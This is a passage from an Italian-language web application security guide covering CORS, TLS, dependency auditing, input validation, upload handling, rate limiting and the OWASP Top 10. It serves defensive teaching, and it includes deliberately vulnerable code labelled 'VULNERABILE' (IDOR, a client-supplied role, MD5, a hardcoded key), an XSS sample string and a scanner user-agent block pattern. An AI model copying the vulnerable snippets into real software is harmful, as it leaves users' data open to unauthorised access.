                   Origin: https://frontend.example.com
                   Content-Type: application/json
                   Authorization: Bearer eyJhbG...
```

### Configurazione CORS per Express

```javascript
import cors from 'cors';

// Configurazione CORS per produzione — MAI usare origin: '*' con credentials
const allowedOrigins = [
  'https://myapp.com',
  'https://www.myapp.com',
  'https://admin.myapp.com'
];

// Per lo sviluppo locale
if (process.env.NODE_ENV === 'development') {
  allowedOrigins.push('http://localhost:3000', 'http://localhost:5173');
}

const corsOptions = {
  origin: (origin, callback) => {
    // Consentire richieste senza origin (app mobile, Postman, server-to-server)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`Origine ${origin} non consentita dalla policy CORS`));
    }
  },

  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],

  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-Request-ID',
    'X-CSRF-Token'
  ],

  exposedHeaders: [
    'X-Total-Count',
    'X-Request-ID',
    'RateLimit-Remaining'
  ],

  credentials: true,    // consente l'invio di cookie cross-origin

  maxAge: 86400,        // cache della risposta preflight per 24 ore

  preflightContinue: false,
  optionsSuccessStatus: 204
};

app.use(cors(corsOptions));

// CORS specifico per singole route
app.get('/api/public/data', cors({ origin: '*' }), (req, res) => {
  // Questo endpoint è accessibile da qualsiasi origine
  // ma NON include credentials
  res.json({ data: 'pubblica' });
});
```

---

## HTTPS e TLS

### Importanza del Trasporto Sicuro

HTTPS cripta tutte le comunicazioni tra client e server, proteggendo da intercettazione (eavesdropping), manomissione (tampering) e impersonificazione (spoofing). Senza HTTPS, tutti i dati — credenziali, cookie di sessione, dati personali — viaggiano in chiaro e possono essere intercettati da chiunque si trovi sulla stessa rete.

### Certificate Management con Let's Encrypt

Let's Encrypt fornisce certificati TLS gratuiti e automatizzati. Certbot è lo strumento standard per la gestione del ciclo di vita dei certificati:

```bash
# Installazione di Certbot
sudo apt install certbot python3-certbot-nginx

# Ottenere un certificato per Nginx
sudo certbot --nginx -d example.com -d www.example.com

# Rinnovo automatico (aggiungere al crontab)
# I certificati Let's Encrypt durano 90 giorni
0 0 1 * * certbot renew --quiet --post-hook "systemctl reload nginx"

# Verifica del certificato
sudo certbot certificates

# Test del rinnovo
sudo certbot renew --dry-run
```

Configurazione Nginx ottimizzata per TLS:

```nginx
server {
    listen 443 ssl http2;
    server_name example.com www.example.com;

    # Certificati Let's Encrypt
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    # TLS 1.3 (preferito) e TLS 1.2 (compatibilità)
    ssl_protocols TLSv1.2 TLSv1.3;

    # Cipher suite moderne
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

    # OCSP Stapling — verifica dello stato del certificato senza contattare la CA
    ssl_stapling on;
    ssl_stapling_verify on;
    ssl_trusted_certificate /etc/letsencrypt/live/example.com/chain.pem;
    resolver 1.1.1.1 8.8.8.8 valid=300s;

    # Session caching per migliorare le prestazioni
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;

    # HSTS — forza HTTPS per 2 anni inclusi sottodomini
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    # Redirect HTTP → HTTPS
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# Redirect HTTP → HTTPS
server {
    listen 80;
    server_name example.com www.example.com;
    return 301 https://$host$request_uri;
}
```

### HSTS Preload

L'HSTS Preload va oltre l'header HSTS standard: il dominio viene incluso in una lista hardcoded nei browser, garantendo che la prima connessione avvenga sempre in HTTPS (eliminando l'attacco alla prima connessione HTTP).

Requisiti per l'inclusione nella HSTS Preload List: certificato TLS valido, redirect HTTP-to-HTTPS sullo stesso host, tutti i sottodomini serviti via HTTPS, header HSTS con `max-age` >= 31536000, `includeSubDomains` e `preload`, e registrazione su `hstspreload.org`.

### TLS 1.3

TLS 1.3 introduce miglioramenti significativi: handshake ridotto a 1 round-trip (0-RTT per connessioni ripetute), cipher suite semplificate con solo AEAD (AES-GCM, ChaCha20-Poly1305), Perfect Forward Secrecy obbligatoria e rimozione di RSA key exchange a favore del solo ECDHE.

```javascript
// Configurazione TLS in Node.js (senza reverse proxy)
import https from 'https';
import fs from 'fs';

const server = https.createServer({
  key: fs.readFileSync('/path/to/privkey.pem'),
  cert: fs.readFileSync('/path/to/fullchain.pem'),
  minVersion: 'TLSv1.2',
  maxVersion: 'TLSv1.3',
  // Cipher suite per TLS 1.2 (TLS 1.3 seleziona automaticamente)
  ciphers: [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
  ].join(':'),
  honorCipherOrder: false  // consentire al client di scegliere
}, app);
```

---

## Dependency Security

Le dipendenze rappresentano una superficie di attacco enorme. Un'applicazione Node.js media include centinaia di pacchetti transitivi, ognuno dei quali potrebbe contenere vulnerabilità note o codice malevolo inserito deliberatamente (supply chain attack).

### npm audit

Lo strumento integrato in npm per l'analisi delle vulnerabilità:

```bash
# Analisi delle vulnerabilità
npm audit

# Output dettagliato in formato JSON (utile per CI/CD)
npm audit --json

# Correzione automatica delle vulnerabilità risolvibili
npm audit fix

# Correzione che include aggiornamenti major (potrebbe rompere la compatibilità)
npm audit fix --force

# Analisi solo delle dipendenze di produzione
npm audit --omit=dev

# Livello di severity minimo per il report
npm audit --audit-level=high
```

### Snyk

Snyk offre un'analisi più approfondita con suggerimenti di remediation specifici:

```bash
# Installazione globale
npm install -g snyk

# Autenticazione
snyk auth

# Test delle vulnerabilità
snyk test

# Monitoraggio continuo (registra il progetto su snyk.io)
snyk monitor

# Test di un'immagine Docker
snyk container test node:18-alpine

# Test del codice sorgente (SAST)
snyk code test
```

### Dependabot

Dependabot è integrato in GitHub e crea automaticamente pull request per aggiornare le dipendenze vulnerabili. Configurazione nel file `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "Europe/Rome"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    # Raggruppare gli aggiornamenti per ridurre il rumore
    groups:
      production-dependencies:
        dependency-type: "production"
      development-dependencies:
        dependency-type: "development"
        update-types:
          - "minor"
          - "patch"
    # Ignorare aggiornamenti specifici
    ignore:
      - dependency-name: "aws-sdk"
        update-types: ["version-update:semver-major"]
```

### Lockfile Security

Il lockfile (`package-lock.json` o `yarn.lock`) garantisce la riproducibilità esatta delle installazioni, impedendo l'installazione silente di versioni diverse:

```bash
# Installare SOLO da lockfile (CI/CD) — non modifica package-lock.json
npm ci

# Verificare l'integrità del lockfile
npm audit signatures

# Verificare che il lockfile sia aggiornato rispetto a package.json
npm install --package-lock-only
```

```javascript
// Configurazione di sicurezza in .npmrc
// engine-strict=true        // rifiuta pacchetti incompatibili con la versione di Node
// ignore-scripts=true       // non eseguire script post-install (previene supply chain)
// audit=true                // eseguire audit automatico su npm install
// fund=false                // disabilita i messaggi di funding
```

---

## Secure Coding Practices

Le pratiche di codifica sicura permeano ogni aspetto dello sviluppo. Non si tratta di regole meccaniche, ma di un mindset che guida ogni decisione di design e implementazione.

### Input Validation

Ogni dato proveniente dall'esterno — query parameters, body delle richieste, header, cookie, dati da API esterne — deve essere considerato potenzialmente ostile e validato prima dell'uso.

```javascript
import Joi from 'joi';
import xss from 'xss';

// Schema di validazione completo per la registrazione utente
const registrationSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required()
    .messages({
      'string.alphanum': 'Il nome utente può contenere solo lettere e numeri',
      'string.min': 'Il nome utente deve avere almeno 3 caratteri'
    }),

  email: Joi.string()
    .email({ tlds: { allow: true } })
    .max(254)
    .required()
    .lowercase()
    .trim(),

  password: Joi.string()
    .min(12)
    .max(128)
    .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .required()
    .messages({
      'string.pattern.base': 'La password deve contenere maiuscola, minuscola, numero e carattere speciale'
    }),

  age: Joi.number()
    .integer()
    .min(13)
    .max(150)
    .optional(),

  bio: Joi.string()
    .max(500)
    .custom((value) => xss(value))  // sanitizzazione HTML
    .optional()
});

// Middleware generico di validazione
function validateBody(schema) {
  return (req, res, next) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false,
      stripUnknown: true,
      convert: true
    });

    if (error) {
      return res.status(400).json({
        error: 'Dati non validi',
        details: error.details.map(d => ({
          field: d.path.join('.'),
          message: d.message
        }))
      });
    }

    req.body = value;
    next();
  };
}
```

### Output Encoding

L'output encoding deve essere specifico per il contesto in cui i dati vengono inseriti:

```javascript
// Contesto HTML — usare librerie come he (html-entities)
import he from 'he';

const safeHTML = he.encode(userInput);
// Input:  <script>alert('XSS')</script>
// Output: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;

// Contesto URL — usare encodeURIComponent
const safeURL = `https://example.com/search?q=${encodeURIComponent(userInput)}`;

// Contesto JSON — JSON.stringify gestisce l'encoding automaticamente
// Ma attenzione all'inserimento in tag <script>
const safeJSON = JSON.stringify(data).replace(/</g, '\\u003c');
```

### Principle of Least Privilege

Ogni componente del sistema deve avere solo i permessi strettamente necessari per svolgere la propria funzione:

```javascript
// Database — utente con permessi minimi
// CREATE USER 'app_reader'@'localhost' IDENTIFIED BY 'strong_password';
// GRANT SELECT ON mydb.public_data TO 'app_reader'@'localhost';
//
// CREATE USER 'app_writer'@'localhost' IDENTIFIED BY 'strong_password';
// GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_writer'@'localhost';
// Nessun DROP, ALTER, o GRANT

// API — controllo granulare dei permessi
function authorize(...requiredPermissions) {
  return (req, res, next) => {
    const userPermissions = req.user.permissions || [];

    const hasAll = requiredPermissions.every(
      perm => userPermissions.includes(perm)
    );

    if (!hasAll) {
      return res.status(403).json({
        error: 'Permessi insufficienti'
      });
    }
    next();
  };
}

// Applicazione per route
app.delete('/api/users/:id',
  authenticate,
  authorize('users:delete'),
  deleteUser
);

app.get('/api/reports',
  authenticate,
  authorize('reports:read'),
  getReports
);
```

### Error Handling Senza Information Leakage

Gli errori devono essere gestiti in modo che l'utente riceva un messaggio comprensibile senza esporre dettagli interni del sistema:

```javascript
// Classe per errori operativi (previsti e gestibili)
class AppError extends Error {
  constructor(message, statusCode, isOperational = true) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = isOperational;
    Error.captureStackTrace(this, this.constructor);
  }
}

// Middleware globale di gestione errori
app.use((err, req, res, next) => {
  // Logging completo per il team di sviluppo
  logger.error({
    message: err.message,
    stack: err.stack,
    url: req.originalUrl,
    method: req.method,
    ip: req.ip,
    userId: req.user?.id,
    timestamp: new Date().toISOString()
  });

  // Risposta al client — MAI esporre dettagli interni
  if (err instanceof AppError && err.isOperational) {
    return res.status(err.statusCode).json({
      error: err.message
    });
  }

  // Errori non previsti — messaggio generico
  res.status(500).json({
    error: 'Si è verificato un errore interno. Riprova più tardi.'
    // MAI includere: stack trace, query SQL, nomi di tabelle,
    // path del filesystem, versioni di librerie, configurazioni
  });
});

// Esempi di errori operativi
throw new AppError('Utente non trovato', 404);
throw new AppError('Email già registrata', 409);
throw new AppError('Token scaduto', 401);

// Gestione di unhandled rejections e uncaught exceptions
process.on('unhandledRejection', (reason) => {
  logger.fatal('Unhandled Rejection:', reason);
  // Graceful shutdown
  server.close(() => process.exit(1));
});

process.on('uncaughtException', (error) => {
  logger.fatal('Uncaught Exception:', error);
  // Lo stato del processo potrebbe essere compromesso — terminare
  server.close(() => process.exit(1));
});
```

---

## File Upload Security

Il caricamento di file è una delle funzionalità più rischiose. Un file malevolo potrebbe contenere malware, eseguire codice arbitrario sul server o sfruttare vulnerabilità nel software di elaborazione file.

### Validazione dei File

```javascript
import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import { fileTypeFromBuffer } from 'file-type';

// Tipi MIME consentiti
const ALLOWED_TYPES = {
  'image/jpeg': ['.jpg', '.jpeg'],
  'image/png': ['.png'],
  'image/gif': ['.gif'],
  'image/webp': ['.webp'],
  'application/pdf': ['.pdf']
};

const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5 MB

// Configurazione multer con validazioni
const upload = multer({
  storage: multer.memoryStorage(), // mantieni in memoria per l'analisi

  limits: {
    fileSize: MAX_FILE_SIZE,
    files: 5,           // massimo 5 file per richiesta
    fields: 10,         // massimo 10 campi non-file
    fieldSize: 1024     // dimensione massima di un campo (1 KB)
  },

  fileFilter: (req, file, cb) => {
    // Verifica l'estensione del file
    const ext = path.extname(file.originalname).toLowerCase();
    const allowedExts = Object.values(ALLOWED_TYPES).flat();

    if (!allowedExts.includes(ext)) {
      return cb(new Error(`Estensione ${ext} non consentita`));
    }

    // Verifica il MIME type dichiarato
    if (!ALLOWED_TYPES[file.mimetype]) {
      return cb(new Error(`Tipo MIME ${file.mimetype} non consentito`));
    }

    cb(null, true);
  }
});

// Middleware di validazione approfondita post-upload
async function validateFileContent(req, res, next) {
  if (!req.file) return next();

  try {
    // Verifica il tipo reale del file analizzando i magic bytes
    const detectedType = await fileTypeFromBuffer(req.file.buffer);

    if (!detectedType || !ALLOWED_TYPES[detectedType.mime]) {
      return res.status(400).json({
        error: 'Il contenuto del file non corrisponde a un tipo consentito'
      });
    }

    // Verifica che il tipo dichiarato corrisponda al tipo reale
    if (detectedType.mime !== req.file.mimetype) {
      return res.status(400).json({
        error: 'Il tipo MIME dichiarato non corrisponde al contenuto'
      });
    }

    // Genera un nome casuale per prevenire path traversal e sovrascritture
    const randomName = crypto.randomBytes(32).toString('hex');
    req.file.safeName = `${randomName}.${detectedType.ext}`;

    next();
  } catch (error) {
    next(error);
  }
}
```

### Storage Sicuro

I file caricati non devono mai essere salvati nella document root del server web. Utilizzare uno storage esterno come S3 con encryption at rest:

```javascript
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';

const s3 = new S3Client({ region: process.env.AWS_REGION });

async function storeFileSecurely(file) {
  const command = new PutObjectCommand({
    Bucket: process.env.UPLOAD_BUCKET,
    Key: `uploads/${file.safeName}`,
    Body: file.buffer,
    ContentType: file.mimetype,
    ContentDisposition: 'attachment',  // forza il download, previene l'esecuzione
    ServerSideEncryption: 'AES256'
  });

  await s3.send(command);
  return { url: `https://${process.env.CDN_DOMAIN}/uploads/${file.safeName}` };
}

app.post('/api/upload',
  authenticate,
  upload.single('file'),
  validateFileContent,
  async (req, res) => {
    req.file.uploadedBy = req.user.id;
    const result = await storeFileSecurely(req.file);
    res.json({ url: result.url });
  }
);
```

### Malware Scanning

Per ambienti che richiedono un livello di sicurezza elevato, integrare un antivirus nella pipeline di upload:

```javascript
import NodeClam from 'clamscan';

const clam = await new NodeClam().init({
  clamdscan: { socket: '/var/run/clamav/clamd.ctl', timeout: 60000 }
});

async function scanForMalware(fileBuffer) {
  const { isInfected, viruses } = await clam.scanStream(
    bufferToStream(fileBuffer)
  );
  if (isInfected) {
    logger.warn(`Malware rilevato: ${viruses.join(', ')}`);
    throw new AppError('Il file contiene contenuto potenzialmente malevolo', 400);
  }
}
```

---

## Rate Limiting e Protezione DDoS

### express-rate-limit

Il rate limiting limita il numero di richieste che un client può effettuare in un periodo di tempo, proteggendo da abusi, brute force e DDoS applicativi (Layer 7).

```javascript
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import Redis from 'ioredis';

const redisClient = new Redis(process.env.REDIS_URL);

// Rate limiter globale
const globalLimiter = rateLimit({
  store: new RedisStore({
    sendCommand: (...args) => redisClient.call(...args)
  }),
  windowMs: 15 * 60 * 1000,  // finestra di 15 minuti
  max: 100,                    // massimo 100 richieste per finestra
  standardHeaders: true,       // invia RateLimit-* headers
  legacyHeaders: false,        // disabilita X-RateLimit-* headers
  message: {
    error: 'Troppe richieste. Riprova tra qualche minuto.'
  },
  keyGenerator: (req) => {
    // Usare l'IP reale dietro un reverse proxy
    return req.ip || req.headers['x-forwarded-for']?.split(',')[0];
  },
  skip: (req) => {
    // Escludere health check dal rate limiting
    return req.path === '/health';
  }
});

// Rate limiter specifico per l'autenticazione (più restrittivo)
const authLimiter = rateLimit({
  store: new RedisStore({
    sendCommand: (...args) => redisClient.call(...args)
  }),
  windowMs: 15 * 60 * 1000,
  max: 5,                     // solo 5 tentativi di login ogni 15 minuti
  skipSuccessfulRequests: true, // non contare i login riusciti
  message: {
    error: 'Troppi tentativi di accesso. Riprova tra 15 minuti.'
  }
});

// Rate limiter per le API (per utente autenticato)
const apiLimiter = rateLimit({
  store: new RedisStore({
    sendCommand: (...args) => redisClient.call(...args)
  }),
  windowMs: 60 * 1000,        // 1 minuto
  max: 60,                     // 60 richieste al minuto
  keyGenerator: (req) => {
    // Rate limiting per utente quando autenticato, per IP altrimenti
    return req.user?.id || req.ip;
  }
});

// Applicazione dei rate limiter
app.use(globalLimiter);
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);
app.use('/api/', apiLimiter);
```

### Web Application Firewall (WAF)

Un WAF opera a livello applicativo (Layer 7) analizzando il traffico HTTP e bloccando richieste malevole prima che raggiungano l'applicazione.

Funzionalità principali di un WAF: rilevamento di injection, rilevamento di bot (fingerprinting, CAPTCHA), virtual patching di vulnerabilità note, geo-blocking e rate limiting avanzato con algoritmi adattivi. I WAF più utilizzati includono AWS WAF, Cloudflare WAF e ModSecurity (open-source).

### Cloudflare

Cloudflare opera come reverse proxy tra gli utenti e il server di origine, fornendo protezione DDoS automatica, CDN e WAF:

```
Utente → Cloudflare Edge (cache + WAF + DDoS protection) → Server di Origine
```

Configurazione di base tramite Cloudflare Workers per logiche personalizzate:

```javascript
// Cloudflare Worker — protezione personalizzata
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const ua = request.headers.get('user-agent') || '';

    // Bloccare user-agent di tool di scansione noti
    if (/sqlmap|nikto|nessus|masscan/i.test(ua)) {
      return new Response('Forbidden', { status: 403 });
    }

    // Rate limiting per path sensibili
    if (url.pathname.startsWith('/api/auth')) {
      const ip = request.headers.get('cf-connecting-ip');
      const { success } = await env.RATE_LIMITER.limit({ key: ip });
      if (!success) return new Response('Too Many Requests', { status: 429 });
    }

    return fetch(request);
  }
};
```

---

## Best Practices

Di seguito le dieci pratiche fondamentali che ogni team di sviluppo web dovrebbe adottare sistematicamente.

**1. Defense in Depth** — non affidarsi mai a un singolo livello di sicurezza. Combinare validazione dell'input, query parametrizzate, output encoding, CSP, security headers e WAF. Se un livello viene bypassato, gli altri continuano a proteggere il sistema.

**2. Principle of Least Privilege** — ogni componente (utente del database, servizio, container, worker) deve operare con i permessi minimi necessari. Un servizio che legge dati non ha bisogno di permessi di scrittura. Un container non ha bisogno di eseguire come root.

**3. Gestione Sicura dei Segreti** — non includere mai segreti nel codice sorgente o nel repository. Utilizzare variabili d'ambiente, secret manager (AWS Secrets Manager, HashiCorp Vault) o file `.env` esclusi dal version control. Ruotare i segreti periodicamente.

```javascript
// .env — MAI committare nel repository
// .gitignore deve includere: .env, .env.*, *.pem, *.key

// Accesso ai segreti tramite variabili d'ambiente
const dbPassword = process.env.DB_PASSWORD;
if (!dbPassword) {
  throw new Error('DB_PASSWORD non configurata');
}

// In produzione, utilizzare un secret manager
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

async function getSecret(secretName) {
  const client = new SecretsManagerClient({ region: 'eu-west-1' });
  const response = await client.send(
    new GetSecretValueCommand({ SecretId: secretName })
  );
  return JSON.parse(response.SecretString);
}
```

**4. Security Logging e Monitoring** — registrare tutti gli eventi rilevanti per la sicurezza: tentativi di autenticazione (riusciti e falliti), modifiche ai permessi, accessi a dati sensibili, errori di autorizzazione. Implementare alerting automatico per pattern anomali.

```javascript
// Logger strutturato per eventi di sicurezza
function logSecurityEvent(event) {
  logger.info({
    type: 'security_event',
    event: event.name,
    userId: event.userId,
    ip: event.ip,
    userAgent: event.userAgent,
    details: event.details,
    timestamp: new Date().toISOString(),
    severity: event.severity  // info, warning, critical
  });
}

// Esempi di utilizzo
logSecurityEvent({
  name: 'login_failed',
  userId: null,
  ip: req.ip,
  userAgent: req.headers['user-agent'],
  details: { username: req.body.username, reason: 'invalid_password' },
  severity: 'warning'
});

logSecurityEvent({
  name: 'permission_escalation_attempt',
  userId: req.user.id,
  ip: req.ip,
  userAgent: req.headers['user-agent'],
  details: { attemptedRole: 'admin', currentRole: 'user' },
  severity: 'critical'
});
```

**5. Aggiornamenti e Patching Tempestivi** — mantenere tutte le dipendenze aggiornate. Configurare Dependabot o Renovate per automatizzare gli aggiornamenti. Monitorare le CVE relative alle tecnologie utilizzate. Pianificare finestre di manutenzione regolari per applicare patch di sicurezza.

**6. Hashing Sicuro delle Password** — utilizzare algoritmi progettati specificamente per il password hashing: bcrypt, scrypt o Argon2. Mai utilizzare MD5, SHA-1 o SHA-256 da soli per le password.

```javascript
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12;  // costo computazionale — aumentare se l'hardware migliora

async function hashPassword(plainPassword) {
  return bcrypt.hash(plainPassword, SALT_ROUNDS);
}

async function verifyPassword(plainPassword, hashedPassword) {
  return bcrypt.compare(plainPassword, hashedPassword);
}

// Argon2 — alternativa moderna raccomandata da OWASP
import argon2 from 'argon2';

async function hashPasswordArgon2(plainPassword) {
  return argon2.hash(plainPassword, {
    type: argon2.argon2id,  // resistente sia a GPU che a side-channel
    memoryCost: 65536,      // 64 MB
    timeCost: 3,            // 3 iterazioni
    parallelism: 4          // 4 thread
  });
}
```

**7. Validazione e Sanitizzazione Sistematiche** — validare tutti i dati in ingresso secondo schemi rigorosi. Applicare whitelist (cosa è consentito) piuttosto che blacklist (cosa è vietato). Sanitizzare l'output in base al contesto di rendering.

**8. Secure Session Management** — generare ID di sessione con sufficiente entropia (almeno 128 bit). Rigenerare l'ID dopo l'autenticazione per prevenire session fixation. Impostare timeout di inattività e durata massima della sessione. Invalidare la sessione al logout.

```javascript
import session from 'express-session';
import RedisStore from 'connect-redis';

app.use(session({
  store: new RedisStore({ client: redisClient }),
  name: '__session',       // nome del cookie non predefinibile
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  rolling: true,           // rinnova il cookie ad ogni richiesta
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000,  // 30 minuti di inattività
    domain: '.example.com'
  }
}));

// Rigenerare l'ID di sessione dopo il login
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  if (user) {
    req.session.regenerate((err) => {
      if (err) return next(err);
      req.session.userId = user.id;
      req.session.loginAt = Date.now();
      res.json({ success: true });
    });
  }
});

// Invalidare completamente la sessione al logout
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) return next(err);
    res.clearCookie('__session');
    res.json({ success: true });
  });
});
```

**9. Security Testing Automatizzato** — integrare test di sicurezza nella pipeline CI/CD. Utilizzare SAST (Static Application Security Testing) per analizzare il codice sorgente, DAST (Dynamic Application Security Testing) per testare l'applicazione in esecuzione, e SCA (Software Composition Analysis) per le dipendenze.

```yaml
# GitHub Actions — pipeline di sicurezza
name: Security Checks
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Dependency audit
        run: npm audit --audit-level=high

      - name: Snyk vulnerability scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: CodeQL analysis (SAST)
        uses: github/codeql-action/analyze@v3
        with:
          languages: javascript

      - name: OWASP ZAP scan (DAST)
        uses: zaproxy/action-full-scan@v0.10.0
        with:
          target: 'https://staging.example.com'
          rules_file_name: '.zap/rules.tsv'
```

**10. Cultura della Sicurezza** — la sicurezza non è responsabilità esclusiva di un team dedicato. Ogni sviluppatore deve comprendere le vulnerabilità comuni e le relative contromisure. Condurre code review focalizzate sulla sicurezza. Organizzare sessioni di formazione periodiche. Implementare un processo di responsible disclosure per le vulnerabilità segnalate dall'esterno. Documentare le decisioni di sicurezza nelle ADR (Architecture Decision Records) e mantenere un threat model aggiornato dell'applicazione.

---

## OWASP Top 10 2021 — Deep Dive

La tabella nella panoramica introduce le dieci categorie. Questa sezione analizza ciascuna in profondità, con esempi di codice, CWE correlate e strategie di mitigazione specifiche.

### A01 — Broken Access Control

Il Broken Access Control sale dalla quinta posizione alla prima nell'edizione 2021, con il 3,81% delle applicazioni testate che presentano almeno una CWE in questa categoria (oltre 318.000 occorrenze rilevate). Questa vulnerabilità si verifica quando un'applicazione non applica correttamente le restrizioni sui permessi, consentendo a utenti non autorizzati di accedere, modificare o eliminare risorse al di fuori dei propri privilegi.

**CWE correlate principali:** CWE-200 (Exposure of Sensitive Information), CWE-284 (Improper Access Control), CWE-285 (Improper Authorization), CWE-639 (Insecure Direct Object Reference — IDOR).

#### IDOR (Insecure Direct Object Reference)

L'IDOR si verifica quando l'applicazione utilizza riferimenti diretti a oggetti interni (ID nel database, nomi di file) senza verificare che l'utente abbia il diritto di accedervi.

```javascript
// VULNERABILE — nessuna verifica di ownership
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.query(
    'SELECT * FROM invoices WHERE id = $1',
    [req.params.id]
  );
  // Un utente può accedere a qualsiasi fattura conoscendone l'ID
  res.json(invoice.rows[0]);
});

// SICURO — verifica ownership e autorizzazione
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.query(
    'SELECT * FROM invoices WHERE id = $1 AND user_id = $2',
    [req.params.id, req.user.id]
  );

  if (invoice.rows.length === 0) {
    return res.status(404).json({ error: 'Fattura non trovata' });
    // Non rivelare se la fattura esiste ma appartiene a un altro utente
  }
  res.json(invoice.rows[0]);
});

// Approccio avanzato con middleware di ownership riutilizzabile
function ownershipCheck(resourceTable, userIdColumn = 'user_id') {
  return async (req, res, next) => {
    const result = await db.query(
      `SELECT id FROM ${resourceTable} WHERE id = $1 AND ${userIdColumn} = $2`,
      [req.params.id, req.user.id]
    );
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Risorsa non trovata' });
    }
    next();
  };
}

app.get('/api/invoices/:id', authenticate, ownershipCheck('invoices'), getInvoice);
app.put('/api/invoices/:id', authenticate, ownershipCheck('invoices'), updateInvoice);
```

#### Privilege Escalation orizzontale e verticale

L'escalation orizzontale avviene quando un utente accede alle risorse di un altro utente con lo stesso livello di privilegio. L'escalation verticale si verifica quando un utente normale ottiene privilegi da amministratore.

```javascript
// VULNERABILE — l'endpoint accetta il ruolo dal client
app.post('/api/users', async (req, res) => {
  const { username, email, role } = req.body;
  // Un attaccante può inviare role: 'admin'
  const user = await createUser({ username, email, role });
  res.json(user);
});

// SICURO — il ruolo viene determinato dal server
app.post('/api/users', async (req, res) => {
  const { username, email } = req.body;
  const user = await createUser({
    username,
    email,
    role: 'user'  // ruolo hardcoded, mai dal client
  });
  res.json(user);
});

// Middleware RBAC (Role-Based Access Control) a grana fine
function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user || !allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Accesso negato' });
    }
    next();
  };
}

app.delete('/api/users/:id', authenticate, requireRole('admin'), deleteUser);
app.get('/api/admin/dashboard', authenticate, requireRole('admin', 'moderator'), getDashboard);
```

**Contromisure fondamentali per A01:** negare l'accesso per default (deny by default), implementare meccanismi di controllo accesso una volta sola e riutilizzarli in tutta l'applicazione, verificare la ownership su ogni risorsa, disabilitare il directory listing del web server, registrare e allertare per ogni fallimento di autorizzazione, invalidare i token JWT al logout.

### A02 — Cryptographic Failures

I fallimenti crittografici espongono dati sensibili a causa di algoritmi deboli, chiavi non gestite correttamente o trasmissione in chiaro. Questa categoria, precedentemente denominata "Sensitive Data Exposure", enfatizza che la causa root è la crittografia insufficiente piuttosto che l'esposizione generica.

```javascript
// VULNERABILE — hashing con MD5 (obsoleto, collisioni note)
const hash = crypto.createHash('md5').update(password).digest('hex');

// VULNERABILE — cifratura con chiave hardcoded
const cipher = crypto.createCipheriv('aes-128-cbc', 'hardcoded-key!!', iv);

// SICURO — Argon2id per password hashing (raccomandato OWASP)
import argon2 from 'argon2';
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536,
  timeCost: 3,
  parallelism: 4
});

// SICURO — cifratura con chiave derivata da secret manager
const key = await getSecretFromVault('ENCRYPTION_KEY');
const iv = crypto.randomBytes(16);
const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
```

**Dati da proteggere sempre con crittografia:** password (hashing con Argon2id/bcrypt/scrypt), numeri di carte di credito (PCI DSS), dati sanitari (HIPAA/GDPR), token di sessione (TLS in transito, cifratura a riposo), PII (nomi, indirizzi, documenti di identità).

### A03 — Injection

